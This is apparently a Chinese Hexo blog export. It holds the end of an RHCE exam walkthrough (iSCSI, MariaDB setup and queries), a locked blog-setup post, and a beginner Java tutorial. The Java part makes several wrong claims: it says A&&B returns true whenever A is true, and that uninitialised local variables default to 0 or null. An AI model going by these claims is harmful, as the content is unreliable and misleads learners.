<li>重启target服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart target</span><br></pre></td></tr></table></figure></li>
<li>设置防火墙规则<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagedc79c65ec8574a1a.png" alt="imagedc79c65ec8574a1a.png"></li>
<li>在system2进行验证<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imaged9bfd2ea27bd1026.png" alt="imaged9bfd2ea27bd1026.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image50d3905f1908bbef.png" alt="image50d3905f1908bbef.png"></li>
</ol>
<h2 id="配置iSCSI客户端"><a href="#配置iSCSI客户端" class="headerlink" title="配置iSCSI客户端"></a>配置iSCSI客户端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置 system2 使其能连接 在 system1 的上提供的 iqn.2014-12.com.example.domain1:system1 并符合以下要求：</span><br><span class="line">iSCSI 设备在系统启动的期间自动加载</span><br><span class="line">块设备 iSCSI 上包含一个大小为 1700 MiB 的分区，并格式化为 xfs</span><br><span class="line">此分区挂载在 /mnt/data 上 同时在系统启动的期间自动挂载</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagea5fcce3be625f683.png" alt="imagea5fcce3be625f683.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image6e4d858f918fb95d.png" alt="image6e4d858f918fb95d.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagee33e34ac33d6d136.png" alt="imagee33e34ac33d6d136.png"></p>
<h2 id="配置一个数据库"><a href="#配置一个数据库" class="headerlink" title="配置一个数据库"></a>配置一个数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 上创建一个 MariaDB 数据库, 名为 Contacts ，并符合以下条件：</span><br><span class="line">数据库应该包含来自数据库复制的内容，复制文件的URL为 http://rhgls.domain1.example.com/materials/users.mdb 。</span><br><span class="line">数据库只能被 localhost 访问。</span><br><span class="line">除了root用户, 此数据库只能被用户 Luigi 查询。 此用户密码为 flectrag 。</span><br><span class="line">root 用户的密码为 flectrag ， 同时不允许空密码登录。</span><br></pre></td></tr></table></figure>
<ol>
<li>安装mariadb、mariadb-client<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum groupinstall mariadb mariadb-client</span><br></pre></td></tr></table></figure></li>
<li>编辑配置文件/etc/my.cnf<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imageb871303488c5a293.png" alt="imageb871303488c5a293.png"></li>
<li>重启mariadb并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br><span class="line">systemctl enable mariadb</span><br></pre></td></tr></table></figure></li>
<li>恢复数据库mariadb.dump并设置Luigi用户的权限<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image808f3cdd5315e9fa.png" alt="image808f3cdd5315e9fa.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagea8dd2c9953085953.png" alt="imagea8dd2c9953085953.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image06e351545672163d.png" alt="image06e351545672163d.png"></li>
<li>数据库初始化，设置root用户密码<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagec1410bfdea664f81.png" alt="imagec1410bfdea664f81.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagef67b53895c32fb96.png" alt="imagef67b53895c32fb96.png"></li>
</ol>
<h2 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库查询，在系统 system1上使用数据库 Contacts， 并使用相应的SQL查询以回答下列问题：</span><br><span class="line">密码是 tangerine 的人的名字?</span><br><span class="line">用户ID号码为4654的用户名成是？</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagea0f72e67bb90b6b8.png" alt="imagea0f72e67bb90b6b8.png"></p>
<h2 id="重启机器，检查题目"><a href="#重启机器，检查题目" class="headerlink" title="重启机器，检查题目"></a>重启机器，检查题目</h2>]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>RHCE</tag>
      </tags>
  </entry>
  <entry>
    <title>githubpages+hexo博客搭建教程</title>
    <url>//posts/ZH-CN/Githubpages_Hexo_Start.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="8e577da3cb84dc79066a6583035239a4753f46a7715c15b03f94f40bcb5dd144"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>搭建博客</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>java编程之快速入门</title>
    <url>//posts/ZH-CN/Java_Basic.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习一门语言，快速入门是给我们增加学习信心的法门。如果门槛都跨不进去，学习就是不可能的事。学习能力实际上体现的是一个人跳出舒适圈的意愿程度。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Java程序必须运行在JVM之上，我们必须安装jdk，此时我们实验的环境是jdk13。</p>
<h2 id="程序基础"><a href="#程序基础" class="headerlink" title="程序基础"></a>程序基础</h2><h3 id="java程序基本结构"><a href="#java程序基本结构" class="headerlink" title="java程序基本结构"></a>java程序基本结构</h3><p>Java是面向对象的语言，一个程序的基本单位就是<code>class</code>。<br>类名要求：</p>
<ul>
<li>类名必须以英文字母开头，后接字母，数字和下划线的组合</li>
<li>习惯以大写字母开头</li>
</ul>
<p>在class内部，可以定义若干<code>方法</code>（method）。方法名也有命名规则，命名和class一样，但是首字母小写。<br>Java入口程序规定的方法必须是静态方法，方法名必须为main，括号内的参数必须是String数组。<br>在方法内部，语句才是真正的执行代码。Java的每一行语句必须以分号结束<br>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123; <span class="comment">//类名是Hello</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; <span class="comment">// 方法名是main</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>); <span class="comment">// 语句</span></span><br><span class="line">    &#125; <span class="comment">// 方法定义结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="变量和数据类型"><a href="#变量和数据类型" class="headerlink" title="变量和数据类型"></a>变量和数据类型</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul>
<li>在Java中，变量必须先定义后使用，在定义变量的时候，可以给它一个初始值。不写初始值，就相当于给它指定了默认值。默认值总是0。</li>
<li>变量的一个重要特点是可以重新赋值。</li>
<li>变量不但可以重新赋值，还可以赋值给其他变量。</li>
</ul>
<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><ol>
<li>基本数据类型<br>基本数据类型是CPU可以直接进行运算的类型。Java定义了以下几种基本数据类型：</li>
</ol>
<ul>
<li>整数类型：byte，short，int，long</li>
<li>浮点数类型：float，double</li>
<li>字符类型：char<ul>
<li>char类型使用单引号<code>&#39;</code>，且仅有一个字符</li>
</ul>
</li>
<li>布尔类型：boolean</li>
</ul>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1qe64m1bj30ji0cgmxc.jpg" alt="image.png"></p>
<ol start="2">
<li>常量</li>
</ol>
<ul>
<li>定义变量的时候，如果加上final修饰符，这个变量就变成了常量。</li>
<li>常量在定义时进行初始化后就不可再次赋值，再次赋值会导致编译错误。</li>
<li>常量的作用是用有意义的变量名来避免魔术数字（Magic number）。</li>
<li>常量名通常全部大写。</li>
</ul>
<ol start="3">
<li>var关键字</li>
</ol>
<ul>
<li>如果想省略变量类型，可以使用var关键字。</li>
</ul>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure>

<h3 id="数学运算（略）"><a href="#数学运算（略）" class="headerlink" title="数学运算（略）"></a>数学运算（略）</h3><p>不想把重点放在数学计算上面，主要是需要学习程序的逻辑。</p>
<h3 id="布尔运算"><a href="#布尔运算" class="headerlink" title="布尔运算"></a>布尔运算</h3><p>主要学习<code>短路运算</code>和<code>三元运算符</code>。</p>
<ul>
<li>短路运算<br>短路运算的原理就是，如果<code>A</code>是true，那么不会判断<code>B</code>是不是true，<code>A&amp;&amp;B</code>的结果直接返回true。</li>
<li>三元运算符<br>原理是：如果<code>b</code>是true，<code>b?x:y</code>返回的值是x，否则返回y。其实就是<code>if-else</code>的简化写法。</li>
</ul>
<h3 id="字符和字符串"><a href="#字符和字符串" class="headerlink" title="字符和字符串"></a>字符和字符串</h3><p>字符和字符串的区别是什么？</p>
<ul>
<li>字符是<code>char</code>，它是基本数据类型。<ul>
<li>字符只表示一个字符，用<code>&#39;</code>引起来。</li>
</ul>
</li>
<li>字符串是<code>String</code>，它是引用类型。<ul>
<li>字符串可以表示0~n个字符，用<code>&quot;</code>引起来。</li>
<li>如果是多行字符串，可以用<code>&quot;&quot;&quot;</code>引起来，避免写换行符。</li>
<li>多个字符串可以使用<code>+</code>拼接。</li>
</ul>
</li>
</ul>
<p>附加知识点：<code>空值null</code><br><code>null</code>其实就是指不存在的东西。</p>
<ul>
<li>把null赋值给一个变量，那么这个变量是null。</li>
<li>不给变量赋初值，这个变量也是null。</li>
<li>把一个null变量赋值给另一个变量，这另一个变量也是null。</li>
<li>但是空字符串不等于null。<br>打个绕口的比喻：我把<code>没有</code>给你，你也是<code>没有</code>。我拿一张<code>白纸</code>给你，那么你也有了一张<code>白纸</code>，尽管纸上什么也没有，但你不是<code>没有</code>。<code>没有</code>这个东西，不管怎么传递，还是<code>没有</code>，不会无中生有。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s1 = <span class="keyword">null</span>; <span class="comment">// s1是null</span></span><br><span class="line">String s2; <span class="comment">// 没有赋初值，s2也是null</span></span><br><span class="line">String s3 = s1; <span class="comment">// s3也是null</span></span><br><span class="line">String s4 = <span class="string">&quot;&quot;</span>; <span class="comment">// s4指向空字符串，不是null</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>定义一个数组类型的变量，使用数组类型<code>类型[]</code>，例如，<code>int[]</code>。和单个基本类型变量不同，数组变量初始化必须使用new int[5]表示创建一个可容纳5个int元素的数组。<br>Java的数组有几个特点：</p>
<ul>
<li>数组所有元素初始化为默认值，整型都是0，浮点型是0.0，布尔型是false；</li>
<li>数组一旦创建后，大小就不可改变。</li>
<li>要访问数组中的某一个元素，需要使用索引。数组索引从0开始，例如，5个元素的数组，索引范围是0~4。</li>
<li>可以修改数组中的某一个元素，使用赋值语句，例如，ns[1] = 79;。</li>
<li>可以用数组变量.length获取数组大小。</li>
<li>数组是引用类型，在使用索引访问数组元素时，如果索引超出范围，运行时将报错。</li>
<li>也可以在定义数组时直接指定初始化的元素，这样就不必写出数组大小，而是由编译器自动推算数组大小。</li>
</ul>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//5位同学的成绩:</span></span><br><span class="line">        <span class="keyword">int</span>[] ns; <span class="comment">//定义一个名为ns的数组</span></span><br><span class="line">        ns = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">68</span>, <span class="number">79</span>, <span class="number">91</span>, <span class="number">85</span>, <span class="number">62</span> &#125;; <span class="comment">//创建数组</span></span><br><span class="line">        System.out.println(ns.length); <span class="comment">//打印数组长度</span></span><br><span class="line">        ns = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;; <span class="comment">//创建数组</span></span><br><span class="line">        System.out.println(ns.length); <span class="comment">//打印数组长度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引申学习：<code>字符串数组</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;ABC&quot;</span>, <span class="string">&quot;XYZ&quot;</span>, <span class="string">&quot;zoo&quot;</span>&#125;; <span class="comment">//定义并创建字符串数组</span></span><br><span class="line">        String s = names[<span class="number">1</span>]; <span class="comment">//取字符串数组的第二个元素</span></span><br><span class="line">        names[<span class="number">1</span>] = <span class="string">&quot;cat&quot;</span>; <span class="comment">//修改数组中的第二个元素</span></span><br><span class="line">        System.out.println(s); <span class="comment">//运行结果是&quot;XYZ&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的运行结果是<code>&quot;XYZ&quot;</code>，说明的是java里面赋值是一种类似指针的概念。names[1]的值指向了s这个变量，之后又把<code>&quot;cat&quot;</code>指向names[1]这个变量。只要指向关系没有改变，变量的 值就不会发生变化。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1rqkc2k7j31f60u077n.jpg" alt="image.png"></p>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h3><p><code>输出</code>的方法比<code>输入</code>的方法简单。先看输出。</p>
<ol>
<li>输出</li>
</ol>
<ul>
<li><code>println</code><br><code>println</code>意思是<code>printline</code>，它会帮我们自动输出换行符。</li>
<li><code>print</code><br>普通输出，不会自动输出换行符。</li>
<li><code>printf</code><br><code>f</code>的意思是<code>format</code>，就是格式化输出的意思。这里和以前学过的C语言的printf用法就差不多的。不细说，需要用的时候查资料。</li>
</ul>
<ol start="2">
<li>输入<br>首先是需要引入<code>java.util.Scanner</code>这个java模块。<br>用法:</li>
</ol>
<ul>
<li>创建Scanner对象。</li>
<li>打印输入提示信息：提示用户需要输入的数据类型是什么。</li>
<li>用户输入信息：可能是字符串或者整数。</li>
<li>读取用户输入的信息并获取字符串或者整数。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in); <span class="comment">// 创建Scanner对象</span></span><br><span class="line">        System.out.print(<span class="string">&quot;Input your name: &quot;</span>); <span class="comment">// 打印提示</span></span><br><span class="line">        String name = scanner.nextLine(); <span class="comment">// 读取一行输入并获取字符串</span></span><br><span class="line">        System.out.print(<span class="string">&quot;Input your age: &quot;</span>); <span class="comment">// 打印提示</span></span><br><span class="line">        <span class="keyword">int</span> age = scanner.nextInt(); <span class="comment">// 读取一行输入并获取整数</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;Hi, %s, you are %d\n&quot;</span>, name, age); <span class="comment">// 格式化输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h3>逻辑很简单，<code>如果……，就……；否则，就……。</code>通常用到的就是这样的逻辑判断。关键点在于判断条件的设置方法。<br>这里有个特殊的用法，判断引用类型（比如<code>字符串String</code>、<code>数组</code>就是引用类型）的变量是否相等，要使用<code>equals()</code>方法。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        String s2 = <span class="string">&quot;HELLO&quot;</span>.toLowerCase();</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        <span class="keyword">if</span> (s1.equals(s2)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;s1 equals s2&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;s1 not equals s2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1sbumb4fj31f60u0n0o.jpg" alt="image.png"><br>引申学习：<code>.toLowerCase()</code>是String的一个方法，可以将字符串内容全部转换为小写字符。</li>
</ul>
<h3 id="switch多重选择"><a href="#switch多重选择" class="headerlink" title="switch多重选择"></a>switch多重选择</h3><p>java13之后使用的语法和以前版本不同，我分成了老语法和新语法。人要与时俱进，老语法了解一下，要熟练应用新语法。<br>据我有限的知识储备，老语法和C语言中的switch用法差不多，和VHDL语法也差不多（还是学过VHDL语法的一点皮毛~），看来编程语法具有许多共通性。</p>
<ul>
<li>老语法<br>switch语句里面的每一个case都要搭配break使用。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> option = <span class="number">99</span>;</span><br><span class="line">        <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected 1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected 2&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected 3&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Not selected&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
switch语句还可以匹配字符串。字符串匹配时，是比较“内容相等”。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String fruit = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (fruit) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;apple&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected apple&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;pear&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected pear&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;mango&quot;</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;Selected mango&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;No fruit selected&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>新语法<br>新的语法简洁许多，不用担心忘记写break。并且case里面可以直接使用<code>yield</code>返回结果（python语法里面也有<code>yield</code>的用法）。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String fruit = <span class="string">&quot;orange&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> opt = <span class="keyword">switch</span> (fruit) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;apple&quot;</span> -&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;pear&quot;</span>, <span class="string">&quot;mango&quot;</span> -&gt; <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">                <span class="keyword">int</span> code = fruit.hashCode(); <span class="comment">//对字符串做hash</span></span><br><span class="line">                System.out.println(code); <span class="comment">//code的值</span></span><br><span class="line">                yield code; <span class="comment">// switch语句返回值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;opt = &quot;</span> + opt); <span class="comment">//yield返回的值就赋值给了opt</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1sutil4jj31f60u0ae1.jpg" alt="image.png"><br>引申学习：<code>.hashCode()</code>是String的一个方法，表示对字符串做hash。</li>
</ul>
<h3 id="while循环和do-while循环"><a href="#while循环和do-while循环" class="headerlink" title="while循环和do while循环"></a>while循环和do while循环</h3><p>这和C语言中的概念也是差不多的，不细说。<br>while循环和do while循环的本质区别就是：</p>
<ul>
<li>while循环先判断条件，再循环。循环体可能不执行。</li>
<li>do while循环先循环再判断。循环体至少执行1次。<br>初高中的时候，数学老师讲过的那两个拗口的中文解释：<code>当型循环</code>和<code>直到型循环</code>分别对应的就是<code>while循环</code>和<code>do while循环</code>。</li>
</ul>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>原来学C语言的时候，把这个for循环是搞昏了的，计数器到底怎么算，一直没搞清。主要是老师讲解的时候，注入了太多数学元素，而我对数字不太感冒，形不成感性认知，也就理解不清楚。现在站在一个稍微宏观的视角来理解，似乎也不难。<br>以这个例子（对1到100进行求和）来理解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">100</span>; i++) &#123;</span><br><span class="line">            sum = sum + i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1u2kxvuuj31f60u0dj5.jpg" alt="image.png"><br>for循环部分，其实就是限定这个循环体的循环次数。从i=1开始，先判断i是否满足条件i&lt;=100，如果满足，就进入循环体，循环结束后，计数器加1。继续判断现在的i是否满足条件i&lt;=100，如果满足，就进入循环体……<br>发现了没有，我描述中的重复部分，就是在执行循环。这就是编程的伟大之处，它给我们节省不少口水和文字。</p>
<ul>
<li>特殊用法<code>for each</code><br>这是java中的一个特殊用法，用来遍历数组。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n : ns) &#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1u1nlu2fj31f60u0whs.jpg" alt="image.png"><br>这里的<code>for (int n : ns)</code>意思就是，遍历数组ns中的每一个元素n。但是，for each循环无法指定遍历顺序，也无法获取数组的索引。</li>
</ul>
<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>在C语言和VHDL语言中，都学过这两个用法：<code>break</code>、<code>continue</code>。可以用在while循环和for循环中。<br><code>break</code>就是戛然而止，就像坐热气球突然把气球炸了。而<code>continue</code>就像刹车，拉手刹之后，车还会滑行一段。</p>
<h2 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h2><h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><p>用for循环和for each循环可以实现数组的遍历。</p>
<ul>
<li>for循环遍历数组<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;ns.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> n = ns[i];</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1u0smr42j31f60u0tc9.jpg" alt="image.png"></li>
<li>for each循环遍历数组<br>前面学习for each循环的时候了解过，不赘述于此。</li>
<li>打印数组元素的妙方<code>Arrays.toString()</code><br>我们可以直接使用<code>Arrays.toString()</code>这个方法将数组里面的每个元素打印出来，不必使用循环遍历数组。前提是我们要事先引入模块<code>java.util.Arrays</code>才可以使用这个方法。<br>举例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ns = &#123; <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span> &#125;;</span><br><span class="line">        System.out.println(Arrays.toString(ns));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
